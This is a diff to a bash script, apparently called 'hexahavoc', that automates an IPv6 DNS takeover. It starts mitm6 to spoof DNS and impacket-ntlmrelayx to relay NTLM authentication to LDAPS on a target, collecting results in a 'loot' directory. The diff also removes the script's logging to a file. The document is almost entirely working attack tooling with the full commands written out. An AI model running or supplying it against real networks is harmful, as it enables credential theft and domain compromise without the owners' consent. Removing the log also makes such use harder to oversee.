@@ -18,12 +18,6 @@ YELLOW="\033[33m"
 CYAN="\033[36m"
 RESET="\033[0m"
 
-# Define log file
-log_file="hexahavoc_$(date '+%Y%m%d_%H%M%S').log"
-
-# Redirect output to log file and console
-exec > >(tee -a "$log_file") 2>&1
-
 # Check if a command exists
 check_command() {
   if ! command -v "$1" &> /dev/null; then
@@ -67,14 +61,15 @@ interface="eth0"
 verbose=0
 silent=0
 session_name="ipv6_dns_takeover"
-dumps_dir="dumps"
+loot_dir="dumps"
 
 # Parse command-line arguments
-while getopts ":d:t:i:vs" opt; do
+while getopts ":d:t:i:l:vs" opt; do
   case "$opt" in
     d) target_domain="$OPTARG" ;;
     t) target_ip="$OPTARG" ;;
     i) interface="$OPTARG" ;;
+    l) loot_dir="$OPTARG" ;;
     v) verbose=1 ;;
     s) silent=1 ;;
     \?) usage ;;
@@ -174,17 +169,18 @@ start_tmux_window "$session_name" "mitm6" "mitm6 -i $interface -d $target_domain
 
 # Start impacket-ntlmrelayx in tmux session
 echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
-start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $dumps_dir" || {
+start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
   echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
   exit 1
 }
 
 # Create dumps directory if it doesn't exist
-if [ ! -d "$dumps_dir" ]; then
-  mkdir -p "$dumps_dir"
+if [ ! -d "$loot_dir" ]; then
+  mkdir -p "$loot_dir"
 else
-  echo -e "${YELLOW}Warning: Dumps directory already exists. Results may be overwritten.${RESET}"
+  echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
 fi
+
 
 # Attach to the tmux session
 echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
